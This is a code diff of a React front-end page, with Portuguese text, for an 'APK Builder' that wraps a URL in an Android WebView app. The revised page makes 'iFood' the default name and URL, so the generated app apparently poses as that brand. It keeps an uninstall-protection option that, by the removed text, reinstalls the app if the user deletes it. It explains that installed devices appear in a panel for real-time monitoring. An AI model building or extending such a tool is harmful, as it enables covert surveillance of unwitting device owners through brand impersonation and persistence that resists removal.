@@ -1,331 +1,352 @@
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Card } from "@/components/ui/card";
-import { Download, Loader2, Copy, Check, Shield, ShieldOff } from "lucide-react";
+import { Label } from "@/components/ui/label";
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { Checkbox } from "@/components/ui/checkbox";
+import { Progress } from "@/components/ui/progress";
+import { AlertCircle, CheckCircle2, Download, Hammer, Smartphone } from "lucide-react";
 import { trpc } from "@/lib/trpc";
+import { toast } from "sonner";
 
-export default function APKBuilderPage() {
-  const [companyName, setCompanyName] = useState("FazTudo"); // v2
-  const [companyUrl, setCompanyUrl] = useState("https://faztudo.com.br");
-  const [logoUrl, setLogoUrl] = useState("https://via.placeholder.com/150");
+export function APKBuilder() {
+  const [appName, setAppName] = useState("iFood");
+  const [appUrl, setAppUrl] = useState("https://www.ifood.com.br/");
+  const [logoUrl, setLogoUrl] = useState("");
+  const [protectFromUninstall, setProtectFromUninstall] = useState(true);
   const [isBuilding, setIsBuilding] = useState(false);
   const [buildProgress, setBuildProgress] = useState(0);
-  const [downloadUrl, setDownloadUrl] = useState<string | null>(null);
-  const [copied, setCopied] = useState(false);
-  const [protectFromUninstall, setProtectFromUninstall] = useState(true);
 
-  const buildApkMutation = trpc.apk.build.useMutation();
+  const buildMutation = trpc.apk.build.useMutation();
+  const listQuery = trpc.apk.list.useQuery();
 
-  const handleBuildAPK = async () => {
-    if (!companyName.trim()) {
-      alert("Por favor, preencha o Nome da Empresa");
+  const handleBuild = async () => {
+    if (!appName.trim()) {
+      toast.error("Nome do app é obrigatório");
       return;
     }
-    
-    if (!companyUrl.trim()) {
-      alert("Por favor, preencha a URL da Empresa");
+
+    if (!appUrl.trim()) {
+      toast.error("URL do app é obrigatória");
       return;
-    }
-    
-    // Validar URL
-    try {
-      new URL(companyUrl);
-    } catch (e) {
-      alert("URL da Empresa inválida. Use o formato: https://exemplo.com");
-      return;
-    }
-    
-    // Validar URL da logo se fornecida
-    if (logoUrl.trim()) {
-      try {
-        new URL(logoUrl);
-      } catch (e) {
-        alert("URL da Logo inválida. Use o formato: https://exemplo.com/logo.png");
-        return;
-      }
     }
 
     setIsBuilding(true);
     setBuildProgress(0);
 
-    const interval = setInterval(() => {
-      setBuildProgress((prev) => {
-        if (prev >= 90) {
-          clearInterval(interval);
-          return prev;
-        }
-        return prev + Math.random() * 30;
-      });
-    }, 500);
+    let progressInterval: ReturnType<typeof setInterval> | null = null;
 
     try {
-      const result = await buildApkMutation.mutateAsync({
-        companyName,
-        companyUrl,
+      // Simular progresso
+      progressInterval = setInterval(() => {
+        setBuildProgress((prev) => {
+          if (prev >= 90) return prev;
+          return prev + Math.random() * 20;
+        });
+      }, 500);
+
+      const result = await buildMutation.mutateAsync({
+        appName,
+        appUrl,
         logoUrl: logoUrl || undefined,
         protectFromUninstall,
       });
 
-      clearInterval(interval);
+      if (progressInterval) clearInterval(progressInterval);
       setBuildProgress(100);
 
-      if (result.success && result.downloadUrl) {
-        // result.downloadUrl já é uma URL completa
-        // Se começar com http/https, usar direto
-        // Se não, adicionar baseUrl
-        let fullDownloadUrl = result.downloadUrl;
-        if (!result.downloadUrl.startsWith('http')) {
-          const baseUrl = window.location.origin;
-          fullDownloadUrl = `${baseUrl}${result.downloadUrl}`;
-        }
-        setDownloadUrl(fullDownloadUrl);
-      } else {
-        throw new Error("Resposta inválida do servidor");
-      }
+      toast.success("APK em construção - Seu APK está sendo gerado. Você receberá o link em breve!");
+
+      // Recarregar lista de builds
+      await listQuery.refetch();
+
+      // Limpar formulário
+      setTimeout(() => {
+        setIsBuilding(false);
+        setBuildProgress(0);
+      }, 1000);
     } catch (error) {
-      clearInterval(interval);
-      console.error("Erro ao gerar APK:", error);
-      const errorMessage = error instanceof Error ? error.message : "Erro desconhecido";
-      alert(`Erro ao gerar APK: ${errorMessage}. Tente novamente.`);
-    } finally {
+      if (progressInterval) clearInterval(progressInterval);
       setIsBuilding(false);
       setBuildProgress(0);
+      toast.error(`Erro ao gerar APK: ${String(error)}`);
     }
   };
 
-  const handleCopyLink = () => {
-    if (downloadUrl) {
-      navigator.clipboard.writeText(downloadUrl);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-    }
-  };
-
-  const handleDownloadAPK = () => {
-    if (downloadUrl) {
-      window.location.href = downloadUrl;
-    }
-  };
+  const builds = listQuery.data || [];
+  const successfulBuilds = builds.filter((b) => b.status === "success");
+  const latestBuild = successfulBuilds[successfulBuilds.length - 1];
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-blue-950 to-slate-950 p-6">
-      <div className="max-w-7xl mx-auto">
-        <h1 className="text-4xl font-bold text-cyan-300 mb-2">🔨 Gerador de APK</h1>
-        <p className="text-slate-400 mb-8">Crie um APK customizado para sua empresa</p>
+    <div className="space-y-6">
+      {/* Header */}
+      <div className="flex items-center gap-3">
+        <Hammer className="w-8 h-8 text-cyan-400" />
+        <div>
+          <h1 className="text-3xl font-bold">APK Builder</h1>
+          <p className="text-gray-400">Gere um APK customizado que abre qualquer URL em WebView</p>
+        </div>
+      </div>
 
-        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-          {/* Formulário */}
-          <Card className="bg-slate-900/50 backdrop-blur-xl border-cyan-400/30 p-8">
-            <h2 className="text-2xl font-bold text-cyan-300 mb-6">📋 Informações da Empresa</h2>
-
-            <div className="space-y-4">
-              <div>
-                <label className="block text-sm font-medium text-slate-300 mb-2">
-                  Nome da Empresa *
-                </label>
+      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        {/* Formulário */}
+        <div className="lg:col-span-1">
+          <Card className="bg-slate-800 border-slate-700">
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <div className="w-6 h-6 bg-cyan-500 rounded flex items-center justify-center text-sm font-bold">
+                  ⚙️
+                </div>
+                Configuração
+              </CardTitle>
+              <CardDescription>Personalize seu APK</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              {/* Nome do App */}
+              <div className="space-y-2">
+                <Label htmlFor="appName" className="text-gray-300">
+                  Nome do App *
+                </Label>
                 <Input
-                  type="text"
-                  placeholder="Ex: FazTudo"
-                  value={companyName}
-                  onChange={(e) => setCompanyName(e.target.value)}
+                  id="appName"
+                  value={appName}
+                  onChange={(e) => setAppName(e.target.value)}
+                  placeholder="Ex: iFood"
+                  className="bg-slate-700 border-slate-600 text-white"
                   disabled={isBuilding}
-                  className="bg-slate-800/50 border-cyan-400/30 text-white"
                 />
+                <p className="text-xs text-gray-500">Aparecerá no ícone do app</p>
               </div>
 
-              <div>
-                <label className="block text-sm font-medium text-slate-300 mb-2">
-                  URL da Empresa *
-                </label>
+              {/* URL do App */}
+              <div className="space-y-2">
+                <Label htmlFor="appUrl" className="text-gray-300">
+                  URL do App *
+                </Label>
                 <Input
+                  id="appUrl"
                   type="url"
-                  placeholder="Ex: https://faztudo.com.br"
-                  value={companyUrl}
-                  onChange={(e) => setCompanyUrl(e.target.value)}
+                  value={appUrl}
+                  onChange={(e) => setAppUrl(e.target.value)}
+                  placeholder="https://www.ifood.com.br/"
+                  className="bg-slate-700 border-slate-600 text-white"
                   disabled={isBuilding}
-                  className="bg-slate-800/50 border-cyan-400/30 text-white"
                 />
+                <p className="text-xs text-gray-500">O APK abrirá esta URL</p>
               </div>
 
-              <div>
-                <label className="block text-sm font-medium text-slate-300 mb-2">
-                  Logo da Empresa (URL)
-                </label>
+              {/* Logo URL */}
+              <div className="space-y-2">
+                <Label htmlFor="logoUrl" className="text-gray-300">
+                  Logo do App (URL)
+                </Label>
                 <Input
+                  id="logoUrl"
                   type="url"
-                  placeholder="Ex: https://..."
                   value={logoUrl}
                   onChange={(e) => setLogoUrl(e.target.value)}
+                  placeholder="https://example.com/logo.png"
+                  className="bg-slate-700 border-slate-600 text-white"
                   disabled={isBuilding}
-                  className="bg-slate-800/50 border-cyan-400/30 text-white"
                 />
+                <p className="text-xs text-gray-500">Opcional - Logo no ícone do app</p>
               </div>
 
-              {/* Proteção contra Desinstalação */}
-              <div className="bg-slate-800/30 border border-cyan-400/20 rounded-lg p-4 mt-6">
-                <div className="flex items-center justify-between">
-                  <div className="flex items-center gap-3">
-                    {protectFromUninstall ? (
-                      <Shield className="w-5 h-5 text-green-400" />
-                    ) : (
-                      <ShieldOff className="w-5 h-5 text-red-400" />
-                    )}
-                    <div>
-                      <p className="text-sm font-medium text-slate-300">
-                        Proteção contra Desinstalação
-                      </p>
-                      <p className="text-xs text-slate-400">
-                        {protectFromUninstall
-                          ? "App será reinstalado automaticamente se removido"
-                          : "App pode ser desinstalado normalmente"}
-                      </p>
-                    </div>
+              {/* Proteção contra desinstalação */}
+              <div className="flex items-center space-x-2 pt-2">
+                <Checkbox
+                  id="protect"
+                  checked={protectFromUninstall}
+                  onCheckedChange={(checked) => setProtectFromUninstall(checked as boolean)}
+                  disabled={isBuilding}
+                />
+                <Label htmlFor="protect" className="text-gray-300 cursor-pointer">
+                  Proteção contra desinstalação
+                </Label>
+              </div>
+
+              {/* Barra de progresso */}
+              {isBuilding && (
+                <div className="space-y-2 pt-4">
+                  <div className="flex justify-between text-sm">
+                    <span className="text-gray-400">Gerando APK...</span>
+                    <span className="text-cyan-400">{Math.round(buildProgress)}%</span>
                   </div>
-                  <button
-                    onClick={() => setProtectFromUninstall(!protectFromUninstall)}
-                    className={`px-3 py-1 rounded text-sm font-medium transition-colors ${
-                      protectFromUninstall
-                        ? "bg-green-500/20 text-green-300 border border-green-500/50"
-                        : "bg-red-500/20 text-red-300 border border-red-500/50"
-                    }`}
-                    disabled={isBuilding}
-                  >
-                    {protectFromUninstall ? "Ativo" : "Inativo"}
-                  </button>
+                  <Progress value={buildProgress} className="bg-slate-700" />
                 </div>
-              </div>
+              )}
 
+              {/* Botão Gerar */}
               <Button
-                onClick={handleBuildAPK}
+                onClick={handleBuild}
                 disabled={isBuilding}
-                className="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 text-white font-bold py-3 rounded-lg disabled:opacity-50 mt-6"
+                className="w-full bg-cyan-600 hover:bg-cyan-700 text-white font-semibold py-2 h-10"
               >
                 {isBuilding ? (
                   <>
-                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-                    Gerando APK... {Math.round(buildProgress)}%
+                    <div className="animate-spin mr-2 w-4 h-4 border-2 border-white border-t-transparent rounded-full" />
+                    Gerando APK...
                   </>
                 ) : (
                   <>
                     <Download className="w-4 h-4 mr-2" />
-                    ▶ Build APK
+                    Gerar APK
                   </>
                 )}
               </Button>
-
-              {isBuilding && (
-                <div className="mt-4">
-                  <div className="flex justify-between text-xs text-slate-400 mb-2">
-                    <span>Progresso</span>
-                    <span>{Math.round(buildProgress)}%</span>
-                  </div>
-                  <div className="w-full bg-slate-700/50 rounded-full h-2">
-                    <div
-                      className="bg-gradient-to-r from-blue-500 to-cyan-500 h-full transition-all"
-                      style={{ width: `${buildProgress}%` }}
-                    ></div>
-                  </div>
-                </div>
-              )}
-
-              {downloadUrl && (
-                <div className="mt-4 p-4 bg-green-900/20 border border-green-400/30 rounded-lg space-y-3">
-                  <p className="text-green-300 text-sm font-semibold">✅ APK gerado com sucesso!</p>
-                  
-                  {protectFromUninstall && (
-                    <div className="bg-green-900/30 border border-green-500/30 rounded p-2">
-                      <p className="text-green-300 text-xs flex items-center gap-2">
-                        <Shield className="w-4 h-4" />
-                        Proteção contra desinstalação: <strong>ATIVA</strong>
-                      </p>
-                    </div>
-                  )}
-                  
-                  <div className="space-y-2">
-                    <p className="text-xs text-slate-400">Link permanente de download:</p>
-                    <div className="flex gap-2">
-                      <input
-                        type="text"
-                        value={downloadUrl}
-                        readOnly
-                        className="flex-1 bg-slate-800/50 border border-cyan-400/30 text-cyan-300 text-xs px-3 py-2 rounded font-mono truncate"
-                      />
-                      <Button
-                        onClick={handleCopyLink}
-                        size="sm"
-                        className="bg-cyan-600 hover:bg-cyan-700 text-white"
-                      >
-                        {copied ? (
-                          <Check className="w-4 h-4" />
-                        ) : (
-                          <Copy className="w-4 h-4" />
-                        )}
-                      </Button>
-                    </div>
-                  </div>
-
-                  <Button
-                    onClick={handleDownloadAPK}
-                    className="w-full bg-green-600 hover:bg-green-700 text-white"
-                  >
-                    <Download className="w-4 h-4 mr-2" />
-                    Baixar APK Agora
-                  </Button>
-
-                  <p className="text-xs text-slate-400 text-center">
-                    Compartilhe o link acima com seus clientes para instalar o app de monitoramento
-                  </p>
-                </div>
-              )}
-            </div>
-          </Card>
-
-          {/* Pré-visualização */}
-          <Card className="bg-slate-900/50 backdrop-blur-xl border-cyan-400/30 p-8">
-            <h2 className="text-2xl font-bold text-cyan-300 mb-6">📱 Pré-visualização</h2>
-
-            <div className="flex justify-center">
-              <div className="w-64 bg-gradient-to-b from-slate-800 to-slate-900 rounded-3xl border-8 border-slate-700 shadow-2xl p-4">
-                {/* Tela do celular */}
-                <div className="bg-slate-950 rounded-2xl p-6 text-center space-y-4">
-                  {/* Logo */}
-                  <div className="flex justify-center">
-                    <img
-                      src={logoUrl}
-                      alt="Logo"
-                      className="w-20 h-20 rounded-2xl object-cover bg-blue-500"
-                      onError={(e) => {
-                        (e.target as HTMLImageElement).src =
-                          "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%230ea5e9' width='100' height='100'/%3E%3C/svg%3E";
-                      }}
-                    />
-                  </div>
-
-                  {/* Nome */}
-                  <h3 className="text-white font-bold text-lg">{companyName}</h3>
-                  <p className="text-slate-400 text-xs">Monitor</p>
-
-                  {/* URL */}
-                  <p className="text-cyan-400 text-xs break-all">{companyUrl}</p>
-
-                  {/* Descrição */}
-                  <p className="text-slate-400 text-xs">Seu APK será customizado com:</p>
-                  <ul className="text-slate-300 text-xs space-y-1">
-                    <li>✓ Logo da empresa</li>
-                    <li>✓ Nome customizado</li>
-                    <li>✓ URL de painel</li>
-                    <li>✓ Tema corporativo</li>
-                    {protectFromUninstall && (
-                      <li>✓ Proteção contra desinstalação</li>
-                    )}
-                  </ul>
-                </div>
-              </div>
-            </div>
+            </CardContent>
           </Card>
         </div>
+
+        {/* Preview + Info */}
+        <div className="lg:col-span-2 space-y-6">
+          {/* Pré-visualização */}
+          <Card className="bg-slate-800 border-slate-700">
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Smartphone className="w-5 h-5 text-cyan-400" />
+                Pré-visualização do Celular
+              </CardTitle>
+            </CardHeader>
+            <CardContent>
+              <div className="flex justify-center">
+                <div className="w-64 h-96 bg-black rounded-3xl border-8 border-gray-800 shadow-2xl flex flex-col items-center justify-center relative">
+                  {/* Notch */}
+                  <div className="absolute top-0 left-1/2 transform -translate-x-1/2 w-40 h-6 bg-black rounded-b-3xl border-l-2 border-r-2 border-b-2 border-gray-800" />
+
+                  {/* Conteúdo */}
+                  <div className="flex flex-col items-center gap-4 mt-8">
+                    {/* Ícone do App */}
+                    <div className="w-20 h-20 bg-gradient-to-br from-cyan-500 to-blue-600 rounded-2xl flex items-center justify-center shadow-lg">
+                      {logoUrl ? (
+                        <img src={logoUrl} alt={appName} className="w-full h-full rounded-2xl object-cover" />
+                      ) : (
+                        <span className="text-white font-bold text-2xl">{appName[0]}</span>
+                      )}
+                    </div>
+
+                    {/* Nome do App */}
+                    <p className="text-white font-semibold text-center text-sm">{appName}</p>
+
+                    {/* Texto */}
+                    <p className="text-gray-400 text-xs text-center">Toque para abrir</p>
+                  </div>
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+
+          {/* Como funciona */}
+          <Card className="bg-slate-800 border-slate-700">
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <AlertCircle className="w-5 h-5 text-cyan-400" />
+                Como funciona:
+              </CardTitle>
+            </CardHeader>
+            <CardContent className="space-y-3 text-sm text-gray-300">
+              <div className="flex gap-3">
+                <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
+                  ✓
+                </div>
+                <p>APK abre uma URL em WebView</p>
+              </div>
+              <div className="flex gap-3">
+                <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
+                  ✓
+                </div>
+                <p>Cliente instala normalmente</p>
+              </div>
+              <div className="flex gap-3">
+                <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
+                  ✓
+                </div>
+                <p>Dispositivo aparece no painel</p>
+              </div>
+              <div className="flex gap-3">
+                <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
+                  ✓
+                </div>
+                <p>Você monitora em tempo real</p>
+              </div>
+            </CardContent>
+          </Card>
+
+          {/* Download Info */}
+          {latestBuild && (
+            <Card className="bg-slate-800 border-slate-700 border-cyan-600">
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2 text-cyan-400">
+                  <CheckCircle2 className="w-5 h-5" />
+                  Download Info
+                </CardTitle>
+              </CardHeader>
+              <CardContent className="space-y-3">
+                <div>
+                  <p className="text-sm text-gray-400">Link de Download:</p>
+                  <a
+                    href={latestBuild.downloadUrl}
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="text-cyan-400 hover:text-cyan-300 break-all text-sm"
+                  >
+                    {latestBuild.downloadUrl}
+                  </a>
+                </div>
+                <div>
+                  <p className="text-sm text-gray-400">Tamanho:</p>
+                  <p className="text-white">
+                    {latestBuild.fileSize ? `${(latestBuild.fileSize / 1024 / 1024).toFixed(2)}MB` : "Calculando..."}
+                  </p>
+                </div>
+              </CardContent>
+            </Card>
+          )}
+        </div>
       </div>
+
+      {/* Histórico de Builds */}
+      {builds.length > 0 && (
+        <Card className="bg-slate-800 border-slate-700">
+          <CardHeader>
+            <CardTitle>Histórico de Builds</CardTitle>
+            <CardDescription>Seus APKs gerados anteriormente</CardDescription>
+          </CardHeader>
+          <CardContent>
+            <div className="space-y-2">
+              {builds.map((build) => (
+                <div key={build.id} className="flex items-center justify-between p-3 bg-slate-700 rounded-lg">
+                  <div>
+                    <p className="font-semibold text-white">{build.appName}</p>
+                    <p className="text-xs text-gray-400">{build.filename}</p>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    {build.status === "success" && (
+                      <>
+                        <span className="text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded">Pronto</span>
+                        <a
+                          href={build.downloadUrl}
+                          target="_blank"
+                          rel="noopener noreferrer"
+                          className="text-cyan-400 hover:text-cyan-300"
+                        >
+                          <Download className="w-4 h-4" />
+                        </a>
+                      </>
+                    )}
+                    {build.status === "building" && (
+                      <span className="text-xs bg-blue-500/20 text-blue-400 px-2 py-1 rounded">Gerando...</span>
+                    )}
+                    {build.status === "failed" && (
+                      <span className="text-xs bg-red-500/20 text-red-400 px-2 py-1 rounded">Erro</span>
+                    )}
+                  </div>
+                </div>
+              ))}
+            </div>
+          </CardContent>
+        </Card>
+      )}
     </div>
   );
 }
